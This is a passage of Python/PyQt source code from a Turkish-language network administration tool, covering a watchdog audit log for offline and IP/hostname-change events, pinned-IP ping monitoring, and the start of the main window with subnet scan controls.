        if event_type in (AuditEvent.OFFLINE, AuditEvent.CRITICAL_OFFLINE):
            if not self.notif_offline.isChecked():
                return
        elif event_type in (AuditEvent.IP_CHANGED, AuditEvent.HOSTNAME_CHANGED):
            if not self.notif_change.isChecked():
                return

        if self._tray:
            icon = (QSystemTrayIcon.MessageIcon.Critical if critical
                    else QSystemTrayIcon.MessageIcon.Information)
            self._tray.showMessage(title, msg, icon, 6000)

    # ── Watchdog Başlat / Durdur ──────────────────────────────────────────────
    def _start_watchdog(self):
        if self._thread and self._thread.isRunning():
            return
        interval = self.interval_spin.value()
        self._thread = WatchdogThread(self.org, self.audit, interval)
        self._thread.event_detected.connect(self._on_event)
        self._thread.scan_complete.connect(self._on_scan_complete)
        self._thread.status_msg.connect(self.status_lbl.setText)
        self._thread.finished.connect(self._on_thread_finished)
        self._thread.start()
        self.btn_start.setEnabled(False)
        self.btn_stop.setEnabled(True)
        self.btn_now.setEnabled(True)
        self.interval_spin.setEnabled(False)
        self.status_lbl.setText(
            f"▶  Watchdog çalışıyor — her {interval} dakikada bir tarama")

    def _on_thread_finished(self):
        """Thread beklenmedik şekilde durursa UI'ı sıfırla."""
        if self._thread and not self._thread.isRunning():
            self._thread = None
            self.btn_start.setEnabled(True)
            self.btn_stop.setEnabled(False)
            self.btn_now.setEnabled(False)
            self.interval_spin.setEnabled(True)

    def _stop_watchdog(self):
        if self._thread:
            self._thread.stop()
            self._thread.wait(3000)
            self._thread = None
        self.btn_start.setEnabled(True)
        self.btn_stop.setEnabled(False)
        self.btn_now.setEnabled(False)
        self.interval_spin.setEnabled(True)
        self.status_lbl.setText("⏸  Watchdog durduruldu.")

    # ── Olay alındı ───────────────────────────────────────────────────────────
    def _scan_now(self):
        """Anında tarama — thread içinde yeni bir _run_scan döngüsü başlatır."""
        if not self._thread or not self._thread.isRunning():
            return
        # Thread'in bir sonraki bekleme döngüsünü atlaması için
        # _stop bayrağını set edip hemen temizleyemeyiz; onun yerine
        # ayrı bir QThread ile tek seferlik tarama yapıyoruz
        self.status_lbl.setText("⚡  Anlık tarama başlatıldı…")
        one_shot = WatchdogThread(self.org, self.audit,
                                   interval_min=9999)  # Otomatik tekrar yok
        one_shot.event_detected.connect(self._on_event)
        one_shot.scan_complete.connect(self._on_scan_complete)
        one_shot.status_msg.connect(self.status_lbl.setText)
        # Tek döngü sonra dur
        one_shot._single_shot = True
        one_shot.start()

    def _on_event(self, entry: AuditEntry):
        """Yeni bir watchdog olayı geldi."""
        self._prepend_row(entry)
        self._update_stats_from_entry(entry)
        self._update_footer()

        # Kritik uyarı → sistem bildirimi
        if entry.event_type in (AuditEvent.CRITICAL_OFFLINE, AuditEvent.OFFLINE,
                                 AuditEvent.IP_CHANGED, AuditEvent.HOSTNAME_CHANGED):
            icon, label, _ = AuditEvent.label(entry.event_type)
            is_crit = entry.event_type == AuditEvent.CRITICAL_OFFLINE
            detail = ""
            if entry.event_type in (AuditEvent.IP_CHANGED, AuditEvent.HOSTNAME_CHANGED):
                detail = f"  {entry.old_value} → {entry.new_value}"
            self._notify(
                f"{icon} {label}: {entry.asset_name}",
                f"IP: {entry.ip}{detail}  |  {entry.timestamp}",
                critical=is_crit,
                event_type=entry.event_type
            )

        # Dashboard panelini güncelle
        main = self.window()
        if hasattr(main, 'dashboard_widget'):
            try:
                main.dashboard_widget._refresh_watchdog_panel()
            except Exception:
                pass

    def _on_scan_complete(self, total: int, online: int):
        self._card_widgets["total"]._val.setText(str(total))
        self._card_widgets["online"]._val.setText(str(online))
        self._card_widgets["offline"]._val.setText(str(total - online))

    # ── Tablo satırı ekle ─────────────────────────────────────────────────────
    def _prepend_row(self, entry: AuditEntry):
        icon, label, color = AuditEvent.label(entry.event_type)
        self.table.insertRow(0)
        vals = [entry.timestamp, entry.asset_name,
                f"{icon}  {label}", entry.old_value,
                entry.new_value, entry.ip, entry.details]
        for ci, val in enumerate(vals):
            item = QTableWidgetItem(str(val))
            item.setForeground(QColor(color if ci == 2 else "#cccccc"))
            if ci == 2:
                item.setBackground(QColor(color + "18"))
            self.table.setItem(0, ci, item)
        self.table.setRowHeight(0, 26)

    def _load_history(self):
        """Mevcut audit log'u tabloya yükle."""
        self.table.setRowCount(0)
        for entry in self.audit.entries:
            self._append_row(entry)
        self._recalc_stats()
        self._update_footer()

    def _append_row(self, entry: AuditEntry):
        row = self.table.rowCount()
        self.table.insertRow(row)
        icon, label, color = AuditEvent.label(entry.event_type)
        vals = [entry.timestamp, entry.asset_name,
                f"{icon}  {label}", entry.old_value,
                entry.new_value, entry.ip, entry.details]
        for ci, val in enumerate(vals):
            item = QTableWidgetItem(str(val))
            item.setForeground(QColor(color if ci == 2 else "#aaaaaa"))
            self.table.setItem(row, ci, item)
        self.table.setRowHeight(row, 24)

    # ── İstatistikler ─────────────────────────────────────────────────────────
    def _recalc_stats(self):
        self._stats = {k: 0 for k in self._stats}
        for e in self.audit.entries:
            if e.event_type in (AuditEvent.OFFLINE, AuditEvent.CRITICAL_OFFLINE):
                self._stats["offline"] += 1
            if e.event_type == AuditEvent.CRITICAL_OFFLINE:
                self._stats["critical"] += 1
            if e.event_type == AuditEvent.IP_CHANGED:
                self._stats["ip_chg"] += 1
            if e.event_type == AuditEvent.HOSTNAME_CHANGED:
                self._stats["hn_chg"] += 1
        assets = self.org.get_assets()
        self._stats["total"] = len(assets)
        for key, card in self._card_widgets.items():
            card._val.setText(str(self._stats.get(key, 0)))

    def _update_stats_from_entry(self, entry: AuditEntry):
        if entry.event_type in (AuditEvent.OFFLINE, AuditEvent.CRITICAL_OFFLINE):
            self._stats["offline"] += 1
            self._card_widgets["offline"]._val.setText(str(self._stats["offline"]))
        if entry.event_type == AuditEvent.CRITICAL_OFFLINE:
            self._stats["critical"] += 1
            self._card_widgets["critical"]._val.setText(str(self._stats["critical"]))
        if entry.event_type == AuditEvent.IP_CHANGED:
            self._stats["ip_chg"] += 1
            self._card_widgets["ip_chg"]._val.setText(str(self._stats["ip_chg"]))
        if entry.event_type == AuditEvent.HOSTNAME_CHANGED:
            self._stats["hn_chg"] += 1
            self._card_widgets["hn_chg"]._val.setText(str(self._stats["hn_chg"]))

    # ── Filtre ───────────────────────────────────────────────────────────────
    def _apply_filter(self):
        fi     = self.filter_combo.currentIndex()
        search = self.search_box.text().strip().lower()
        TYPE_MAP = {
            0: None,
            1: [AuditEvent.OFFLINE, AuditEvent.CRITICAL_OFFLINE],
            2: [AuditEvent.ONLINE, AuditEvent.BACK_ONLINE],
            3: [AuditEvent.IP_CHANGED],
            4: [AuditEvent.HOSTNAME_CHANGED],
            5: [AuditEvent.CRITICAL_OFFLINE],
            6: [AuditEvent.NEW_UNKNOWN],
        }
        allowed = TYPE_MAP.get(fi)
        for row in range(self.table.rowCount()):
            hide = False
            if allowed:
                lbl_item = self.table.item(row, 2)
                if lbl_item:
                    matched = any(
                        AuditEvent.label(et)[1] in lbl_item.text()
                        for et in allowed
                    )
                    if not matched:
                        hide = True
            if not hide and search:
                name = (self.table.item(row, 1) or QTableWidgetItem("")).text()
                ip   = (self.table.item(row, 5) or QTableWidgetItem("")).text()
                if search not in name.lower() and search not in ip.lower():
                    hide = True
            self.table.setRowHidden(row, hide)
        self._update_footer()

    def _update_footer(self):
        table_rows = self.table.rowCount()
        visible    = sum(1 for r in range(table_rows) if not self.table.isRowHidden(r))
        try:
            db_total = self.audit.count()
        except Exception:
            db_total = table_rows
        active_str = "  |  🟢 Watchdog aktif" if (self._thread and self._thread.isRunning()) else ""
        self.footer_lbl.setText(
            f"{visible} kayıt gösteriliyor  |  Veritabanı toplam: {db_total:,} kayıt"
            f"{active_str}  |  {self.audit._file}")

    # ── Araçlar ───────────────────────────────────────────────────────────────
    def _export_csv(self):
        path, _ = QFileDialog.getSaveFileName(
            self, "Audit Log İndir", "watchdog_log.csv", "CSV (*.csv)")
        if path:
            self.audit.export_csv(path)
            QMessageBox.information(self, "✅ İndirildi", f"Log kaydedildi:\n{path}")

    def _clear_history(self):
        db_total = self.audit.count()
        reply = QMessageBox.question(
            self, "Geçmişi Temizle",
            f"Veritabanındaki <b>{db_total:,}</b> kayıt silinecek. Devam edilsin mi?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        if reply == QMessageBox.StandardButton.Yes:
            self.audit.clear()
            self.table.setRowCount(0)
            self._recalc_stats()
            self._update_footer()

    def _show_row_menu(self, pos):
        """Olay satırında sağ tık menüsü."""
        row = self.table.rowAt(pos.y())
        if row < 0:
            return
        # Varlık adı ve olay türünü al
        name_item = self.table.item(row, 1)
        type_item = self.table.item(row, 2)
        old_item  = self.table.item(row, 3)
        new_item  = self.table.item(row, 4)
        if not name_item:
            return

        asset_name = name_item.text()
        event_txt  = type_item.text() if type_item else ""
        old_val    = old_item.text() if old_item else ""
        new_val    = new_item.text() if new_item else ""

        menu = QMenu(self)
        menu.setStyleSheet("""
            QMenu{background:#1a1a2e;color:white;border:1px solid #00ff88;
                  border-radius:6px;padding:4px;}
            QMenu::item{padding:8px 16px;border-radius:3px;}
            QMenu::item:selected{background:#00ff88;color:#0a0a14;}
        """)

        # Varlığa git
        act_goto = menu.addAction(f"🔍  '{asset_name}' varlığını bul")
        act_goto.triggered.connect(lambda: self._goto_asset(asset_name))

        # IP veya Hostname değişimiyse → Güncelle seçeneği
        if "IP Değişti" in event_txt and new_val:
            menu.addSeparator()
            act_apply = menu.addAction(f"🔄  Yeni IP'yi kaydet: {new_val}")
            act_apply.triggered.connect(
                lambda: self._apply_change(asset_name, "ip_address", old_val, new_val))
        elif "Hostname Değişti" in event_txt and new_val:
            menu.addSeparator()
            act_apply = menu.addAction(f"🖥️  Yeni hostname'i kaydet: {new_val}")
            act_apply.triggered.connect(
                lambda: self._apply_change(asset_name, "hostname", old_val, new_val))

        menu.addSeparator()
        menu.addAction("📋  Satırı kopyala").triggered.connect(
            lambda: QApplication.clipboard().setText(
                " | ".join(
                    (self.table.item(row, c) or QTableWidgetItem("")).text()
                    for c in range(self.table.columnCount())
                )
            )
        )
        menu.exec(self.table.viewport().mapToGlobal(pos))

    def _goto_asset(self, asset_name: str):
        """Varlıklar sekmesine geçip ilgili varlığı seç."""
        main = self.window()
        if not hasattr(main, 'org_widget') or not hasattr(main, 'tabs'):
            return
        main.tabs.setCurrentWidget(main.org_widget)
        # Tabloda ara
        tbl = main.org_widget.asset_table
        for row in range(tbl.rowCount()):
            item = tbl.item(row, 0)
            if item and item.text().strip() == asset_name.strip():
                tbl.selectRow(row)
                tbl.scrollToItem(item)
                break

    def _apply_change(self, asset_name: str, field: str, old_val: str, new_val: str):
        """Tespit edilen değişikliği veritabanına uygula."""
        # Varlığı ada göre bul
        asset = next((a for a in self.org.assets.values()
                      if a.name == asset_name), None)
        if not asset:
            QMessageBox.warning(self, "Bulunamadı",
                                f"'{asset_name}' adlı varlık bulunamadı.")
            return
        field_label = "IP Adresi" if field == "ip_address" else "Hostname"
        reply = QMessageBox.question(
            self, "Değişikliği Uygula",
            f"<b>{asset_name}</b> için {field_label} güncellensin mi?<br><br>"
            f"<span style='color:#aaa'>Eski:</span> {old_val}<br>"
            f"<span style='color:#00ff88'>Yeni:</span> {new_val}",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        if reply == QMessageBox.StandardButton.Yes:
            self.org.update_asset(asset.id, **{field: new_val})
            # Audit'e uygulama kaydı ekle
            self.audit.add(asset.id, asset_name, AuditEvent.IP_CHANGED
                           if field == "ip_address" else AuditEvent.HOSTNAME_CHANGED,
                           old_value=old_val, new_value=new_val,
                           details="Watchdog tespitinden manuel güncelleme")
            # Org widget'ı yenile
            main = self.window()
            if hasattr(main, 'org_widget'):
                main.org_widget.refresh_assets()
            # Varlık combo'sunu da güncelle
            self._populate_asset_combo()
            QMessageBox.information(self, "✅ Güncellendi",
                                    f"{field_label} başarıyla güncellendi.")


    # ══════════════════════════════════════════════════════════════════════════
    #  SABİT IP İZLEME — metodlar
    # ══════════════════════════════════════════════════════════════════════════


    def _populate_asset_combo(self):
        """Org'daki tüm IP'li varlıkları combo'ya yükle."""
        combo = self.pinned_asset_combo
        combo.blockSignals(True)
        combo.clear()
        combo.addItem("", None)   # boş seçenek

        assets = sorted(
            [a for a in self.org.assets.values() if a.ip_address],
            key=lambda a: (a.name or "").lower()
        )
        for a in assets:
            # Gösterim: "Ad  —  IP  (Hostname)"
            display = a.name
            if a.ip_address:
                display += f"  —  {a.ip_address}"
            if a.hostname:
                display += f"  ({a.hostname})"
            # UserRole'de (ip, label) tuple'ı sakla
            label = a.name
            if a.hostname:
                label = f"{a.name} ({a.hostname})"
            combo.addItem(display, (a.ip_address, label))

        # QCompleter — yazarken filtrele
        completer = QCompleter(
            [combo.itemText(i) for i in range(combo.count())], combo)
        completer.setCaseSensitivity(Qt.CaseSensitivity.CaseInsensitive)
        completer.setFilterMode(Qt.MatchFlag.MatchContains)
        combo.setCompleter(completer)
        combo.blockSignals(False)

    def _on_asset_selected(self, index: int):
        """Combo'dan seçim yapıldığında IP + label alanlarını doldur."""
        data = self.pinned_asset_combo.itemData(index)
        if data:
            ip, label = data
            self.pinned_ip_input.setText(ip)
            self.pinned_label_input.setText(label)

    def _add_from_asset_combo(self):
        """Combo'daki seçili varlığı direkt ekle."""
        # Önce metin eşleşmesi dene (kullanıcı yazmış olabilir)
        text = self.pinned_asset_combo.currentText().strip()
        data = self.pinned_asset_combo.currentData()

        if data:
            ip, label = data
        else:
            # Yazı ile eşleşen öğeyi bul
            for i in range(self.pinned_asset_combo.count()):
                if self.pinned_asset_combo.itemText(i) == text:
                    d = self.pinned_asset_combo.itemData(i)
                    if d:
                        ip, label = d
                        break
            else:
                # Eşleşme yok — manuel alanlara geç
                self._add_pinned_ip()
                return

        if not ip:
            return

        # Manuel alanlara yaz ve ekle
        self.pinned_ip_input.setText(ip)
        self.pinned_label_input.setText(label)
        self._add_pinned_ip()

        # Combo'yu sıfırla
        self.pinned_asset_combo.setCurrentIndex(0)
        self.pinned_asset_combo.lineEdit().clear()

    def _load_pinned_ips(self):
        """Settings'ten kayıtlı IP'leri yükle ve tabloya ekle."""
        self._populate_asset_combo()   # varlık listesini combo'ya yükle
        saved = (self.settings.get('pinned_ips', [])
                 if self.settings else [])
        for entry in saved:
            ip    = entry.get('ip', '')
            label = entry.get('label', '')
            if ip:
                self._add_row_to_pinned_table(ip, label)
        self._update_pinned_summary()
        if saved:
            self._start_pinned_thread()

    def _save_pinned_ips(self):
        """Mevcut IP listesini Settings'e kaydet."""
        if not self.settings:
            return
        rows = []
        for row in range(self.pinned_table.rowCount()):
            ip_item  = self.pinned_table.item(row, 1)
            lbl_item = self.pinned_table.item(row, 2)
            if ip_item:
                rows.append({
                    'ip':    ip_item.text().strip(),
                    'label': lbl_item.text().strip() if lbl_item else '',
                })
        self.settings.set('pinned_ips', rows)

    def _add_pinned_ip(self):
        """IP + açıklama kutusundan yeni satır ekle."""
        ip    = self.pinned_ip_input.text().strip()
        label = self.pinned_label_input.text().strip()
        if not ip:
            return
        # Basit format kontrolü
        parts = ip.split('.')
        if not (3 <= len(parts) <= 4 and all(p.isdigit() for p in parts)):
            QMessageBox.warning(self, "Geçersiz IP",
                f"'{ip}' geçerli bir IPv4 adresi değil.\n\nÖrnek: 10.0.0.1")
            return
        # Tekrar ekleme kontrolü
        for row in range(self.pinned_table.rowCount()):
            if self.pinned_table.item(row, 1) and                self.pinned_table.item(row, 1).text() == ip:
                QMessageBox.information(self, "Zaten Var",
                    f"{ip} listede zaten mevcut.")
                return
        self._add_row_to_pinned_table(ip, label)
        self.pinned_ip_input.clear()
        self.pinned_label_input.clear()
        self._save_pinned_ips()
        self._update_pinned_summary()
        self._start_pinned_thread()   # thread'i yenile

    def _add_row_to_pinned_table(self, ip: str, label: str = ""):
        """Tabloya tek satır ekle (başlangıç durumu: bekliyor)."""
        row = self.pinned_table.rowCount()
        self.pinned_table.insertRow(row)

        # Durum sütunu
        status_item = QTableWidgetItem("⏳")
        status_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        status_item.setForeground(QColor("#888888"))
        self.pinned_table.setItem(row, 0, status_item)

        # IP
        ip_item = QTableWidgetItem(ip)
        ip_item.setForeground(QColor("#00d4ff"))
        self.pinned_table.setItem(row, 1, ip_item)

        # Açıklama
        lbl_item = QTableWidgetItem(label)
        lbl_item.setForeground(QColor("#aaaaaa"))
        self.pinned_table.setItem(row, 2, lbl_item)

        # Gecikme
        ms_item = QTableWidgetItem("—")
        ms_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        ms_item.setForeground(QColor("#666666"))
        self.pinned_table.setItem(row, 3, ms_item)

        # Son kontrol
        ts_item = QTableWidgetItem("Bekleniyor…")
        ts_item.setForeground(QColor("#555555"))
        self.pinned_table.setItem(row, 4, ts_item)

        # Sil butonu (6. sütun)
        del_btn = QPushButton("✕")
        del_btn.setFixedSize(26, 22)
        del_btn.setToolTip("Listeden kaldır")
        del_btn.setStyleSheet(
            "QPushButton{background:#641E16;color:#e74c3c;border:none;"
            "border-radius:4px;font-weight:bold;font-size:11px;}"
            "QPushButton:hover{background:#e74c3c;color:white;}")
        # row capture için default arg kullan
        del_btn.clicked.connect(
            (lambda r, i: lambda: self._remove_pinned_ip(r, i))(row, ip))
        cell_widget = QWidget()
        cell_layout = QHBoxLayout(cell_widget)
        cell_layout.setContentsMargins(3, 2, 3, 2)
        cell_layout.addWidget(del_btn)
        self.pinned_table.setCellWidget(row, 5, cell_widget)

        self.pinned_table.setRowHeight(row, 28)
        self._pinned_state[ip] = {
            "up": None, "ms": 0.0,
            "last": "", "label": label,
            "up_since": "", "down_since": "",
            "fail_count": 0,
        }

    def _update_pinned_row(self, ip: str, is_up: bool, ms: float):
        """Ping sonucu geldiğinde ilgili satırı güncelle."""
        now  = datetime.now().strftime("%H:%M:%S")
        prev = self._pinned_state.get(ip, {})

        # Durum değişimi tespiti (audit log'a yaz)
        if prev.get("up") is not None and prev["up"] != is_up:
            event = AuditEvent.BACK_ONLINE if is_up else AuditEvent.OFFLINE
            label = prev.get("label", "")
            name  = f"{ip}" + (f"  ({label})" if label else "")
            entry = self.audit.add("pinned", name, event, ip=ip,
                                   details="Sabit IP izleme")
            self._prepend_row(entry)
            self._update_footer()
            # Bildirim
            icon_s, lbl_s, _ = AuditEvent.label(event)
            self._notify(f"{icon_s} {lbl_s}: {name}",
                         f"IP: {ip}  |  {now}",
                         critical=False, event_type=event)

        # State güncelle
        state = self._pinned_state.setdefault(ip, {})
        state["up"]   = is_up
        state["ms"]   = ms
        state["last"] = now
        if is_up:
            state["fail_count"] = 0
            if not state.get("up_since"):
                state["up_since"] = now
            state["down_since"] = ""
        else:
            state["fail_count"] = state.get("fail_count", 0) + 1
            if not state.get("down_since"):
                state["down_since"] = now
            state["up_since"] = ""

        # Tabloda satırı bul ve güncelle
        for row in range(self.pinned_table.rowCount()):
            ip_item = self.pinned_table.item(row, 1)
            if not ip_item or ip_item.text() != ip:
                continue

            if is_up:
                status = "🟢"
                status_color = "#00ff88"
                ms_str  = f"{ms:.0f} ms"
                ms_color = ("#00ff88" if ms < 50 else
                            "#f39c12" if ms < 150 else "#e74c3c")
                bg = "#00ff8808"
            else:
                status = "🔴"
                status_color = "#e74c3c"
                fc = state.get("fail_count", 1)
                ms_str   = f"✗ ({fc})"
                ms_color = "#e74c3c"
                bg = "#e74c3c08"

            s_item = QTableWidgetItem(status)
            s_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
            s_item.setForeground(QColor(status_color))
            s_item.setBackground(QColor(bg))
            self.pinned_table.setItem(row, 0, s_item)

            m_item = QTableWidgetItem(ms_str)
            m_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
            m_item.setForeground(QColor(ms_color))
            self.pinned_table.setItem(row, 3, m_item)

            t_item = QTableWidgetItem(now)
            t_item.setForeground(QColor("#666666"))
            self.pinned_table.setItem(row, 4, t_item)
            break

        self._update_pinned_summary()

    def _update_pinned_summary(self):
        """Alt özet etiketini güncelle."""
        total   = self.pinned_table.rowCount()
        up      = sum(1 for v in self._pinned_state.values() if v.get("up") is True)
        down    = sum(1 for v in self._pinned_state.values() if v.get("up") is False)
        waiting = total - up - down
        if total == 0:
            self.pinned_summary.setText("Henüz IP eklenmedi — yukarıdan ekleyebilirsiniz")
            return
        parts = [f"🟢 {up} çevrimiçi", f"🔴 {down} çevrimdışı"]
        if waiting:
            parts.append(f"⏳ {waiting} bekleniyor")
        self.pinned_summary.setText("  |  ".join(parts)
                                    + f"  —  toplam {total} IP")

    def _start_pinned_thread(self):
        """Sabit IP thread'ini başlat ya da IP listesini güncelle."""
        ips = []
        for row in range(self.pinned_table.rowCount()):
            ip_item = self.pinned_table.item(row, 1)
            if ip_item:
                ips.append(ip_item.text().strip())
        if not ips:
            return
        interval = self.pinned_interval.value()
        if self._pinned_thread and self._pinned_thread.isRunning():
            self._pinned_thread.set_ips(ips)
            self._pinned_thread.set_interval(interval)
            return
        self._pinned_thread = PinnedIPThread(ips, interval)
        self._pinned_thread.result.connect(self._update_pinned_row)
        self._pinned_thread.start()

    def _stop_pinned_thread(self):
        if self._pinned_thread and self._pinned_thread.isRunning():
            self._pinned_thread.stop()
            self._pinned_thread.wait(3000)
            self._pinned_thread = None

    def _pinned_context_menu(self, pos):
        """Sabit IP tablosunda sağ tık menüsü."""
        row = self.pinned_table.rowAt(pos.y())
        if row < 0:
            return
        ip_item  = self.pinned_table.item(row, 1)
        lbl_item = self.pinned_table.item(row, 2)
        if not ip_item:
            return
        ip    = ip_item.text()
        label = lbl_item.text() if lbl_item else ""
        state = self._pinned_state.get(ip, {})

        menu = QMenu(self)
        menu.setStyleSheet("""
            QMenu{background:#1a1a2e;color:white;border:1px solid #00d4ff;
                  border-radius:6px;padding:4px;}
            QMenu::item{padding:8px 16px;border-radius:3px;}
            QMenu::item:selected{background:#00d4ff;color:#0a0a14;}
            QMenu::item[data-del="1"]{color:#e74c3c;}
        """)

        # Açıklama düzenleme
        act_edit = menu.addAction("✏️  Açıklamayı Düzenle")
        act_edit.triggered.connect(lambda: self._edit_pinned_label(row, ip))

        menu.addSeparator()

        # Kopyala
        menu.addAction("📋  IP Kopyala").triggered.connect(
            lambda: QApplication.clipboard().setText(ip))

        # Durum bilgisi (devre dışı — sadece bilgi)
        if state.get("up") is True and state.get("up_since"):
            info_act = menu.addAction(
                f"⏱️  Çevrimiçi: {state['up_since']}'dan beri")
            info_act.setEnabled(False)
        elif state.get("up") is False and state.get("down_since"):
            info_act = menu.addAction(
                f"⏱️  Çevrimdışı: {state['down_since']}'dan beri")
            info_act.setEnabled(False)

        menu.addSeparator()

        # Sil — QAction'da setStyleSheet yok; öneki kırmızı emoji ile belirt
        act_del = menu.addAction("🗑️  Listeden Kaldır")
        act_del.triggered.connect(lambda: self._remove_pinned_ip(row, ip))

        menu.exec(self.pinned_table.viewport().mapToGlobal(pos))

    def _edit_pinned_label(self, row: int, ip: str):
        """Açıklama metnini düzenleme diyaloğu."""
        current = (self.pinned_table.item(row, 2) or
                   QTableWidgetItem("")).text()
        text, ok = QInputDialog.getText(
            self, "Açıklamayı Düzenle",
            f"{ip} için açıklama:", text=current)
        if ok:
            item = QTableWidgetItem(text.strip())
            item.setForeground(QColor("#aaaaaa"))
            self.pinned_table.setItem(row, 2, item)
            if ip in self._pinned_state:
                self._pinned_state[ip]["label"] = text.strip()
            self._save_pinned_ips()

    def _remove_pinned_ip(self, row: int, ip: str):
        """IP'yi listeden kaldır — satır indeksini IP ile doğrula."""
        # Güvenlik: row artık kaymış olabilir; IP ile bul
        target_row = row
        for r in range(self.pinned_table.rowCount()):
            item = self.pinned_table.item(r, 1)
            if item and item.text() == ip:
                target_row = r
                break
        self.pinned_table.removeRow(target_row)
        self._pinned_state.pop(ip, None)
        self._save_pinned_ips()
        self._update_pinned_summary()
        # Thread IP listesini güncelle
        ips = [self.pinned_table.item(r, 1).text()
               for r in range(self.pinned_table.rowCount())
               if self.pinned_table.item(r, 1)]
        if self._pinned_thread and self._pinned_thread.isRunning():
            self._pinned_thread.set_ips(ips)
        if not ips:
            self._stop_pinned_thread()

    def stop_watchdog(self):
        """Dışarıdan çağrılabilir (closeEvent için)."""
        self._stop_watchdog()
        self._stop_pinned_thread()


# ============= MAIN WINDOW =============
class MotunNetWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.devices = []
        self.scanner_thread = None
        self.settings = SettingsManager()
        self.vnc_manager=VNCManager(self.settings);self.org=OrganizationManager(self.settings.get('data_path',''));self.setup_ui();self.apply_theme();self.start_sync_timer()
    def setup_ui(self):
        self.setWindowTitle("MotunNet v10.4 - Ultimate Network Suite");self.setWindowIcon(create_app_icon());self.setMinimumSize(1300,750)
        central=QWidget();self.setCentralWidget(central);main=QHBoxLayout(central);main.setSpacing(8);main.setContentsMargins(8,8,8,8)
        
        # Ana Splitter - Sol/Sağ ayarlanabilir
        main_splitter=QSplitter(Qt.Orientation.Horizontal)
        main_splitter.setHandleWidth(3);main_splitter.setStyleSheet("QSplitter::handle{background:#0f3460;border-radius:2px;}")
        
        # SOL PANEL
        left=QWidget();left.setMinimumWidth(320);left.setMaximumWidth(450)
        left_layout=QVBoxLayout(left);left_layout.setSpacing(6);left_layout.setContentsMargins(0,0,0,0)
        
        # Logo
        logo_layout=QHBoxLayout();logo=QLabel();logo.setPixmap(create_app_icon().pixmap(36,36));logo_layout.addWidget(logo)
        title=QLabel("MOTUNNET");title.setStyleSheet("font-size:18px;font-weight:bold;color:#00ff88;");logo_layout.addWidget(title);logo_layout.addStretch();left_layout.addLayout(logo_layout)
        ver=QLabel("v10.4 Ultimate Edition");ver.setStyleSheet("color:#666;font-size:9px;");ver.setAlignment(Qt.AlignmentFlag.AlignCenter);left_layout.addWidget(ver)
        
        # Radar - esnek boyut
        self.radar=CyberpunkRadarWidget();self.radar.setMinimumSize(280,280);self.radar.device_clicked.connect(self.show_device_details);self.radar.assign_asset.connect(self.quick_assign_asset);self.radar.edit_asset.connect(self.edit_device_asset);self.radar.vnc_requested.connect(self.connect_vnc);left_layout.addWidget(self.radar,1)
        
        # Kontroller - Kompakt
        controls=QGroupBox("⚙️ Tarama");controls.setMaximumHeight(160);c_layout=QGridLayout(controls);c_layout.setSpacing(4)
        c_layout.addWidget(QLabel("Alt Ağ:"),0,0);self.subnet_input=QLineEdit(self.settings.get('subnet') or get_subnet());self.subnet_input.setMinimumWidth(100);c_layout.addWidget(self.subnet_input,0,1)
        c_layout.addWidget(QLabel("Aralık:"),0,2);range_l=QHBoxLayout();self.start_spin=QSpinBox();self.start_spin.setRange(1,254);self.start_spin.setValue(1);self.start_spin.setFixedWidth(55);self.end_spin=QSpinBox();self.end_spin.setRange(1,254);self.end_spin.setValue(254);self.end_spin.setFixedWidth(55);range_l.addWidget(self.start_spin);range_l.addWidget(QLabel("-"));range_l.addWidget(self.end_spin);range_l.addStretch();c_layout.addLayout(range_l,0,3)
        self.offline_check=QCheckBox("Çevrimdışı");self.offline_check.setChecked(False);c_layout.addWidget(self.offline_check,1,0,1,2)
        
        # Sürekli tarama modu
        self.continuous_check=QCheckBox("🔄 Sürekli Tarama")
        self.continuous_check.setToolTip("Tarama bitince otomatik olarak tekrar başlar")
        self.continuous_check.setStyleSheet("QCheckBox{color:#00d4ff;font-weight:bold;}")
        c_layout.addWidget(self.continuous_check,1,2,1,2)
        
        # Tarama aralığı
        interval_l=QHBoxLayout()
        interval_l.addWidget(QLabel("Aralık:"))
        self.scan_interval=QSpinBox();self.scan_interval.setRange(15,300);self.scan_interval.setValue(30);self.scan_interval.setSuffix(" sn");self.scan_interval.setFixedWidth(70)
        self.scan_interval.setToolTip("Taramalar arası bekleme süresi (saniye)")
        interval_l.addWidget(self.scan_interval);interval_l.addStretch()
        c_layout.addLayout(interval_l,2,0,1,4)
        
        # Sürekli tarama timer'ı
        self.continuous_timer=QTimer(self)
        self.continuous_timer.timeout.connect(self.continuous_scan_tick)
        self.continuous_countdown=0
        
        left_layout.addWidget(controls)
        
        # Butonlar
        btns=QHBoxLayout();btns.setSpacing(4)
        self.scan_btn=QPushButton("🔍 Tara");self.scan_btn.setMinimumHeight(40);self.scan_btn.setStyleSheet("QPushButton{background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #0f3460,stop:1 #16213e);color:#00ff88;border:2px solid #00ff88;border-radius:8px;font-weight:bold;font-size:12px;}QPushButton:hover{background:#00ff88;color:#1a1a2e;}QPushButton:disabled{background:#333;color:#666;border-color:#333;}");self.scan_btn.clicked.connect(self.toggle_scan);btns.addWidget(self.scan_btn)
        self.stop_btn=QPushButton("⏹");self.stop_btn.setMinimumHeight(40);self.stop_btn.setFixedWidth(45);self.stop_btn.setEnabled(False);self.stop_btn.clicked.connect(self.stop_scan);btns.addWidget(self.stop_btn);left_layout.addLayout(btns)
        
        # Progress
        self.progress=QProgressBar();self.progress.setStyleSheet("QProgressBar{border:1px solid #0f3460;border-radius:6px;background:#16213e;color:#00ff88;font-weight:bold;text-align:center;font-size:10px;}QProgressBar::chunk{background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #00ff88,stop:1 #00d4ff);border-radius:5px;}");self.progress.setMinimumHeight(18);self.progress.setMaximumHeight(20);left_layout.addWidget(self.progress)
        
        # Filtreler - Kompakt
        filter_group=QGroupBox("🔍 Filtreler");filter_group.setMaximumHeight(140);filter_layout=QGridLayout(filter_group);filter_layout.setSpacing(4)
        filter_layout.addWidget(QLabel("Birim:"),0,0);self.dept_filter=QComboBox();self.dept_filter.setMinimumWidth(120);self.dept_filter.addItem("Tümü","")
        for dept in self.org.get_departments():self.dept_filter.addItem(f"🏢 {dept.name}",dept.id)
